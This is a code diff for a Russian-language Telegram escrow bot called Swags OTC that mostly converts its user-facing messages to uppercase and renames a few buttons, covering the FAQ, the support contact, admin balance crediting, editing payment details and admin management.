 ❓ ЧАСТЫЕ ВОПРОСЫ
 
-🔹 Как начать сделку?
-Нажмите «📦 Создать сделку» и следуйте инструкции. Продавец получит ссылку для покупателя.
+🔹 КАК НАЧАТЬ СДЕЛКУ?
+НАЖМИТЕ «📦 СОЗДАТЬ СДЕЛКУ» И СЛЕДУЙТЕ ИНСТРУКЦИИ. ПРОДАВЕЦ ПОЛУЧИТ ССЫЛКУ ДЛЯ ПОКУПАТЕЛЯ.
 
-🔹 Какие валюты доступны?
+🔹 КАКИЕ ВАЛЮТЫ ДОСТУПНЫ?
 💎 TON | ⭐️ STARS | ₽ RUB | ₴ UAH
 
-🔹 Как я получу оплату?
-После того как покупатель подтвердит получение товара, деньги зачисляются на ваш баланс.
+🔹 КАК Я ПОЛУЧУ ОПЛАТУ?
+ПОСЛЕ ТОГО КАК ПОКУПАТЕЛЬ ПОДТВЕРДИТ ПОЛУЧЕНИЕ ТОВАРА, ДЕНЬГИ ЗАЧИСЛЯЮТСЯ НА ВАШ БАЛАНС.
 
-🔹 Как вывести деньги?
-Нажмите «💰 Баланс и вывод», выберите валюту и укажите реквизиты.
+🔹 КАК ВЫВЕСТИ ДЕНЬГИ?
+НАЖМИТЕ «💰 МОЙ БАЛАНС», ВЫБЕРИТЕ ВАЛЮТУ И УКАЖИТЕ РЕКВИЗИТЫ.
 
-🔹 Безопасно ли это?
-Да! Администратор проверяет оплату по реквизитам, а при оплате с баланса сделка автоматическая.
+🔹 БЕЗОПАСНО ЛИ ЭТО?
+ДА! АДМИНИСТРАТОР ПРОВЕРЯЕТ ОПЛАТУ ПО РЕКВИЗИТАМ, А ПРИ ОПЛАТЕ С БАЛАНСА СДЕЛКА АВТОМАТИЧЕСКАЯ.
 
-🔹 Сколько времени занимает вывод?
-Обычно 1-5 минут после подтверждения администратором.
+🔹 СКОЛЬКО ВРЕМЕНИ ЗАНИМАЕТ ВЫВОД?
+ОБЫЧНО 1-5 МИНУТ ПОСЛЕ ПОДТВЕРЖДЕНИЯ АДМИНИСТРАТОРОМ.
 
-🔹 Как связаться с поддержкой?
-Нажмите кнопку «🆘 Поддержка» ниже
+🔹 КАК СВЯЗАТЬСЯ С ПОДДЕРЖКОЙ?
+НАЖМИТЕ КНОПКУ «🆘 ПОДДЕРЖКА» НИЖЕ
 """
     await message.answer(faq_text, reply_markup=main_menu(message.from_user.id))
 
 # ========== ПОДДЕРЖКА ==========
-@dp.message(F.text == "🆘 Поддержка")
+@dp.message(F.text == "🆘 ПОДДЕРЖКА")
 async def support(message: types.Message):
     await message.answer(
-        f"🆘 Служба поддержки Swags OTC\n\n"
-        f"📞 Связь с оператором:\n{SUPPORT_LINK}\n\n"
-        f"📝 Что писать в поддержку:\n"
-        f"• ID сделки (если есть)\n"
-        f"• Подробное описание проблемы\n"
-        f"• Скриншоты\n\n"
-        f"⏰ Время ответа: до 15 минут\n\n"
-        f"✨ Мы всегда готовы помочь!",
+        f"🆘 СЛУЖБА ПОДДЕРЖКИ SWAGS OTC\n\n"
+        f"📞 СВЯЗЬ С ОПЕРАТОРОМ:\n{SUPPORT_LINK}\n\n"
+        f"📝 ЧТО ПИСАТЬ В ПОДДЕРЖКУ:\n"
+        f"• ID СДЕЛКИ (ЕСЛИ ЕСТЬ)\n"
+        f"• ПОДРОБНОЕ ОПИСАНИЕ ПРОБЛЕМЫ\n"
+        f"• СКРИНШОТЫ\n\n"
+        f"⏰ ВРЕМЯ ОТВЕТА: ДО 15 МИНУТ\n\n"
+        f"✨ МЫ ВСЕГДА ГОТОВЫ ПОМОЧЬ!",
         reply_markup=main_menu(message.from_user.id),
         disable_web_page_preview=True
     )
@@ -884,10 +866,10 @@ async def support(message: types.Message):
 @dp.callback_query(lambda c: c.data == "admin_add_balance")
 async def admin_add_balance_start(callback: types.CallbackQuery, state: FSMContext):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
+        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
         return
     await state.set_state(AdminAddBalanceState.waiting_for_user_id)
-    await callback.message.answer("💰 Введите Telegram ID пользователя, которому хотите начислить баланс:\n\nЧтобы узнать ID пользователя, можно использовать бота @userinfobot")
+    await callback.message.answer("💰 ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ, КОТОРОМУ ХОТИТЕ НАЧИСЛИТЬ БАЛАНС:\n\nЧТОБЫ УЗНАТЬ ID, МОЖНО ИСПОЛЬЗОВАТЬ БОТА @userinfobot")
     await callback.answer()
 
 @dp.message(AdminAddBalanceState.waiting_for_user_id)
@@ -896,7 +878,7 @@ async def admin_add_balance_user_id(message: types.Message, state: FSMContext):
         user_id = int(message.text.strip())
         await state.update_data(target_user_id=user_id)
         await state.set_state(AdminAddBalanceState.waiting_for_currency)
-        await message.answer("💎 Выберите валюту:",
+        await message.answer("💎 ВЫБЕРИТЕ ВАЛЮТУ:",
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="💎 TON", callback_data="admin_balance_TON")],
                 [InlineKeyboardButton(text="⭐️ STARS", callback_data="admin_balance_STARS")],
@@ -904,14 +886,14 @@ async def admin_add_balance_user_id(message: types.Message, state: FSMContext):
                 [InlineKeyboardButton(text="₴ UAH", callback_data="admin_balance_UAH")]
             ]))
     except ValueError:
-        await message.answer("❌ Введите числовой ID пользователя")
+        await message.answer("❌ ВВЕДИТЕ ЧИСЛОВОЙ ID ПОЛЬЗОВАТЕЛЯ")
 
 @dp.callback_query(lambda c: c.data.startswith("admin_balance_"))
 async def admin_add_balance_currency(callback: types.CallbackQuery, state: FSMContext):
     currency = callback.data.split("_")[2]
     await state.update_data(target_currency=currency)
     await state.set_state(AdminAddBalanceState.waiting_for_amount)
-    await callback.message.edit_text(f"💰 Введите сумму для начисления в {currency}:")
+    await callback.message.edit_text(f"💰 ВВЕДИТЕ СУММУ ДЛЯ НАЧИСЛЕНИЯ В {currency}:")
     await callback.answer()
 
 @dp.message(AdminAddBalanceState.waiting_for_amount)
@@ -926,40 +908,40 @@ async def admin_add_balance_amount(message: types.Message, state: FSMContext):
         
         add_balance(user_id, currency, amount)
         
-        await message.answer(f"✅ Начислено {amount} {currency} пользователю (ID: {user_id})")
+        await message.answer(f"✅ НАЧИСЛЕНО {amount} {currency} ПОЛЬЗОВАТЕЛЮ (ID: {user_id})")
         await log_to_master(f"💰 Админ @{message.from_user.username} начислил {amount} {currency} пользователю ID:{user_id}")
         
         try:
             await bot.send_message(
                 user_id,
                 f"💰 ВАШ БАЛАНС ПОПОЛНЕН!\n\n"
-                f"Сумма: {amount} {currency}\n\n"
-                f"Проверить баланс: /start → «Баланс и вывод»"
+                f"СУММА: {amount} {currency}\n\n"
+                f"ПРОВЕРИТЬ БАЛАНС: /start → «МОЙ БАЛАНС»"
             )
         except:
             pass
         
         await state.clear()
     except:
-        await message.answer("❌ Введите положительное число")
+        await message.answer("❌ ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО")
 
 # ========== АДМИН-ПАНЕЛЬ ==========
-@dp.message(F.text == "👑 Админ-панель")
+@dp.message(F.text == "👑 АДМИН ПАНЕЛЬ")
 async def admin_panel(message: types.Message):
     if not is_admin(message.from_user.id):
         return
-    await message.answer("👑 Панель администратора\n\nВыберите действие:", reply_markup=admin_panel_keyboard())
+    await message.answer("👑 ПАНЕЛЬ АДМИНИСТРАТОРА\n\nВЫБЕРИТЕ ДЕЙСТВИЕ:", reply_markup=admin_panel_keyboard())
 
 @dp.callback_query(lambda c: c.data == "withdraw_requests")
 async def show_withdraw_requests(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
+        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
         return
     
     pending = {rid: req for rid, req in withdraw_requests.items() if req["status"] == "pending"}
     
     if not pending:
-        await callback.message.answer("📭 Нет активных заявок на вывод")
+        await callback.message.answer("📭 НЕТ АКТИВНЫХ ЗАЯВОК НА ВЫВОД")
     else:
         text = "💸 ЗАЯВКИ НА ВЫВОД\n\n"
         for rid, req in pending.items():
@@ -973,16 +955,16 @@ async def show_withdraw_requests(callback: types.CallbackQuery):
 @dp.callback_query(lambda c: c.data == "change_photo")
 async def change_photo_prompt(callback: types.CallbackQuery, state: FSMContext):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
+        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
         return
-    await callback.message.answer("📷 Отправьте новое фото для приветственного сообщения.\n\nФото должно быть в формате JPEG или PNG.")
+    await callback.message.answer("📷 ОТПРАВЬТЕ НОВОЕ ФОТО ДЛЯ ПРИВЕТСТВЕННОГО СООБЩЕНИЯ.\n\nФОТО ДОЛЖНО БЫТЬ В ФОРМАТЕ JPEG ИЛИ PNG.")
     await state.set_state(PhotoStates.waiting_for_photo)
     await callback.answer()
 
 @dp.message(PhotoStates.waiting_for_photo)
 async def save_photo_handler(message: types.Message, state: FSMContext):
     if not is_admin(message.from_user.id):
-        await message.answer("⛔️ Доступ запрещён")
+        await message.answer("⛔️ ДОСТУП ЗАПРЕЩЁН")
         await state.clear()
         return
     
@@ -990,10 +972,10 @@ async def save_photo_handler(message: types.Message, state: FSMContext):
         file_id = message.photo[-1].file_id
         start_photo["file_id"] = file_id
         save_start_photo(start_photo)
-        await message.answer("✅ Фото для приветственного сообщения обновлено!")
+        await message.answer("✅ ФОТО ДЛЯ ПРИВЕТСТВЕННОГО СООБЩЕНИЯ ОБНОВЛЕНО!")
         await log_to_master(f"🖼 Админ {message.from_user.full_name} изменил фото при старте")
     else:
-        await message.answer("❌ Отправьте фото, а не другой файл")
+        await message.answer("❌ ОТПРАВЬТЕ ФОТО, А НЕ ДРУГОЙ ФАЙЛ")
     
     await state.clear()
 
@@ -1001,17 +983,17 @@ async def save_photo_handler(message: types.Message, state: FSMContext):
 @dp.callback_query(lambda c: c.data == "edit_rekvisits")
 async def edit_rekvisits_panel(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
+        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
         return
-    await callback.message.edit_text("💳 Редактирование реквизитов оплаты\n\nВыберите валюту для изменения:", reply_markup=rekvisits_edit_keyboard())
+    await callback.message.edit_text("💳 РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ ОПЛАТЫ\n\nВЫБЕРИТЕ ВАЛЮТУ ДЛЯ ИЗМЕНЕНИЯ:", reply_markup=rekvisits_edit_keyboard())
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "edit_ton")
 async def edit_ton(callback: types.CallbackQuery, state: FSMContext):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
+        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
         return
-    await callback.message.answer("📝 Введите новый текст для оплаты TON:\n\nИспользуйте {amount} для подстановки суммы")
+    await callback.message.answer("📝 ВВЕДИТЕ НОВЫЙ ТЕКСТ ДЛЯ ОПЛАТЫ TON:\n\nИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ")
     await state.update_data(rekv_type="ton")
     await state.set_state(RekvStates.waiting_for_rekv_text)
     await callback.answer()
@@ -1019,9 +1001,9 @@ async def edit_ton(callback: types.CallbackQuery, state: FSMContext):
 @dp.callback_query(lambda c: c.data == "edit_stars")
 async def edit_stars(callback: types.CallbackQuery, state: FSMContext):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
+        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
         return
-    await callback.message.answer("📝 Введите новый текст для оплаты STARS:\n\nИспользуйте {amount} для подстановки суммы")
+    await callback.message.answer("📝 ВВЕДИТЕ НОВЫЙ ТЕКСТ ДЛЯ ОПЛАТЫ STARS:\n\nИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ")
     await state.update_data(rekv_type="stars")
     await state.set_state(RekvStates.waiting_for_rekv_text)
     await callback.answer()
@@ -1029,9 +1011,9 @@ async def edit_stars(callback: types.CallbackQuery, state: FSMContext):
 @dp.callback_query(lambda c: c.data == "edit_rub")
 async def edit_rub(callback: types.CallbackQuery, state: FSMContext):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
+        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
         return
-    await callback.message.answer("📝 Введите новый текст для оплаты RUB:\n\nИспользуйте {amount} для подстановки суммы")
+    await callback.message.answer("📝 ВВЕДИТЕ НОВЫЙ ТЕКСТ ДЛЯ ОПЛАТЫ RUB:\n\nИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ")
     await state.update_data(rekv_type="rub")
     await state.set_state(RekvStates.waiting_for_rekv_text)
     await callback.answer()
@@ -1039,9 +1021,9 @@ async def edit_rub(callback: types.CallbackQuery, state: FSMContext):
 @dp.callback_query(lambda c: c.data == "edit_uah")
 async def edit_uah(callback: types.CallbackQuery, state: FSMContext):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
+        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
         return
-    await callback.message.answer("📝 Введите новый текст для оплаты UAH:\n\nИспользуйте {amount} для подстановки суммы")
+    await callback.message.answer("📝 ВВЕДИТЕ НОВЫЙ ТЕКСТ ДЛЯ ОПЛАТЫ UAH:\n\nИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ")
     await state.update_data(rekv_type="uah")
     await state.set_state(RekvStates.waiting_for_rekv_text)
     await callback.answer()
@@ -1053,25 +1035,25 @@ async def save_rekv_text(message: types.Message, state: FSMContext):
     if rekv_type:
         rekvisits[rekv_type] = message.text.strip()
         save_rekvisits(rekvisits)
-        await message.answer(f"✅ Реквизиты для {rekv_type.upper()} обновлены!")
+        await message.answer(f"✅ РЕКВИЗИТЫ ДЛЯ {rekv_type.upper()} ОБНОВЛЕНЫ!")
         await log_to_master(f"💳 Админ {message.from_user.full_name} изменил реквизиты для {rekv_type.upper()}")
     await state.clear()
 
 @dp.callback_query(lambda c: c.data == "back_to_admin")
 async def back_to_admin(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
+        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
         return
-    await callback.message.edit_text("👑 Панель администратора\n\nВыберите действие:", reply_markup=admin_panel_keyboard())
+    await callback.message.edit_text("👑 ПАНЕЛЬ АДМИНИСТРАТОРА\n\nВЫБЕРИТЕ ДЕЙСТВИЕ:", reply_markup=admin_panel_keyboard())
     await callback.answer()
 
 # ========== УПРАВЛЕНИЕ АДМИНАМИ ==========
 @dp.callback_query(lambda c: c.data == "add_admin")
 async def add_admin_prompt(callback: types.CallbackQuery):
     if callback.from_user.id != MASTER_ADMIN_ID:
-        await callback.answer("⛔️ Только главный админ", show_alert=True)
+        await callback.answer("⛔️ ТОЛЬКО ГЛАВНЫЙ АДМИН", show_alert=True)
         return
-    await callback.message.answer("📝 Введите Telegram ID пользователя для добавления в админы:")
+    await callback.message.answer("📝 ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ ДЛЯ ДОБАВЛЕНИЯ В АДМИНЫ:")
     await callback.answer()
 
 @dp.message(lambda msg: msg.text and msg.text.isdigit() and msg.from_user.id == MASTER_ADMIN_ID)
@@ -1079,47 +1061,47 @@ async def add_admin_process(message: types.Message):
     user_id = int(message.text.strip())
     admins.add(user_id)
     save_admins(admins)
-    await message.answer(f"✅ Пользователь {user_id} теперь администратор!")
+    await message.answer(f"✅ ПОЛЬЗОВАТЕЛЬ {user_id} ТЕПЕРЬ АДМИНИСТРАТОР!")
     await log_to_master(f"👑 Новый админ добавлен: {user_id}")
 
 @dp.callback_query(lambda c: c.data == "remove_admin")
 async def remove_admin_prompt(callback: types.CallbackQuery):
     if callback.from_user.id != MASTER_ADMIN_ID:
-        await callback.answer("⛔️ Только главный админ", show_alert=True)
+        await callback.answer("⛔️ ТОЛЬКО ГЛАВНЫЙ АДМИН", show_alert=True)
         return
-    await callback.message.answer("📝 Введите Telegram ID пользователя для удаления из админов:")
+    await callback.message.answer("📝 ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ ДЛЯ УДАЛЕНИЯ ИЗ АДМИНОВ:")
     await callback.answer()
 
 @dp.message(lambda msg: msg.text and msg.text.isdigit() and msg.from_user.id == MASTER_ADMIN_ID)
 async def remove_admin_process(message: types.Message):
     user_id = int(message.text.strip())
     if user_id == MASTER_ADMIN_ID:
-        await message.answer("❌ Нельзя удалить главного админа")
+        await message.answer("❌ НЕЛЬЗЯ УДАЛИТЬ ГЛАВНОГО АДМИНА")
         return
     if user_id in admins:
         admins.remove(user_id)
         save_admins(admins)
-        await message.answer(f"✅ Пользователь {user_id} больше не администратор.")
+        await message.answer(f"✅ ПОЛЬЗОВАТЕЛЬ {user_id} БОЛЬШЕ НЕ АДМИНИСТРАТОР.")
         await log_to_master(f"👑 Админ удалён: {user_id}")
     else:
-        await message.answer("❌ Не найден")
+        await message.answer("❌ НЕ НАЙДЕН")
 
 @dp.callback_query(lambda c: c.data == "list_admins")
 async def list_admins_callback(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
+        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
         return
     admin_list = "\n".join([f"• {aid}" for aid in admins])
-    await callback.message.answer(f"👥 Список админов:\n\n{admin_list}")
+    await callback.message.answer(f"👥 СПИСОК АДМИНОВ:\n\n{admin_list}")
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "all_deals")
 async def all_deals_callback(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
+        await callback.answer("⛔️ ДОСТУП ЗАПРЕЩЁН", show_alert=True)
         return
     if not deals:
-        await callback.message.answer("📭 Нет сделок")
+        await callback.message.answer("📭 НЕТ СДЕЛОК")
     else:
         text = "📋 ВСЕ СДЕЛКИ\n\n"
         for deal_id, deal in list(deals.items())[-20:]:
@@ -1130,26 +1112,25 @@ async def all_deals_callback(callback: types.CallbackQuery):
 
 @dp.callback_query(lambda c: c.data == "noop")
 async def noop_callback(callback: types.CallbackQuery):
-    await callback.answer("⏳ Дождитесь, когда продавец передаст товар")
+    await callback.answer("⏳ ДОЖДИТЕСЬ, КОГДА ПРОДАВЕЦ ПЕРЕДАСТ ТОВАР")
 
 @dp.callback_query(lambda c: c.data.startswith("support_"))
 async def support_callback(callback: types.CallbackQuery):
     deal_id = callback.data.split("_")[1]
     await callback.answer()
     await callback.message.answer(
-        f"📞 По вопросам сделки #{deal_id} обращайтесь в поддержку:\n{SUPPORT_LINK}"
+        f"📞 ПО ВОПРОСАМ СДЕЛКИ #{deal_id} ОБРАЩАЙТЕСЬ В ПОДДЕРЖКУ:\n{SUPPORT_LINK}"
     )
 
 # ========== ЗАПУСК ==========
 async def main():
-    print(f"🚀 SWAGS OTC запущен")
-    print(f"👑 Главный админ: {MASTER_ADMIN_ID}")
-    print(f"👥 Всего админов: {len(admins)}")
-    print(f"🤖 Бот: @swags_otc_bot")
-    print(f"💳 Доступные валюты: TON, STARS, RUB, UAH")
-    print(f"✅ Деньги зачисляются продавцу ТОЛЬКО после подтверждения покупателя")
-    print(f"✅ Покупатель видит кнопку сразу после оплаты, но активной она становится после передачи товара")
-    print(f"✅ Ссылка на сделку: tg://resolve?domain={BOT_USERNAME}&start=deal_xxxxx")
+    print(f"🚀 SWAGS OTC ЗАПУЩЕН")
+    print(f"👑 ГЛАВНЫЙ АДМИН: {MASTER_ADMIN_ID}")
+    print(f"👥 ВСЕГО АДМИНОВ: {len(admins)}")
+    print(f"🤖 БОТ: @swags_otc_bot")
+    print(f"💳 ДОСТУПНЫЕ ВАЛЮТЫ: TON, STARS, RUB, UAH")
+    print(f"✅ ДЕНЬГИ ЗАЧИСЛЯЮТСЯ ПРОДАВЦУ ТОЛЬКО ПОСЛЕ ПОДТВЕРЖДЕНИЯ ПОКУПАТЕЛЯ")
+    print(f"✅ ССЫЛКА НА СДЕЛКУ: https://t.me/{BOT_USERNAME}?start=deal_xxxxx")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
